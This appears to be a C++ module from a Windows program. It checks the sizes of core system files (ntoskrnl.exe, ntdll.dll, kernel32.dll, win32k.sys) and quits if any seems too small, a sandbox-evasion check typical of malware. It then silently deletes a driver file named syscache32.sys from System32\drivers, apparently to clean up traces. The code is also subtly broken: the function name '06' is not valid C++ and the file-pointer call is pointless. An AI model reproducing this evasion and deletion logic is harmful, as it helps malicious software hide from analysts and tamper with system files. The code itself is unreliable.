#include "01.h"
#include "06.h"
void 06() {
    wchar_t t[4][MAX_PATH] = {
        L"C:\\Windows\\System32\\ntoskrnl.exe",
        L"C:\\Windows\\System32\\ntdll.dll",
        L"C:\\Windows\\System32\\kernel32.dll",
        L"C:\\Windows\\System32\\win32k.sys"
    };
    HANDLE h[4];
    for (int i = 0; i < 4; i++) {
        h[i] = CreateFile(t[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        if (h[i] != INVALID_HANDLE_VALUE) {
            SetFilePointer(h[i], 0, NULL, FILE_END);
            DWORD s = GetFileSize(h[i], NULL);
            if (s < 1000000) ExitProcess(0);
            CloseHandle(h[i]);
        }
    }
    wchar_t p[MAX_PATH];
    GetSystemDirectory(p, MAX_PATH);
    std::wstring dll = p;
    dll += L"\\drivers\\syscache32.sys";
    if (GetFileAttributes(dll.c_str()) != INVALID_FILE_ATTRIBUTES) DeleteFile(dll.c_str());
}
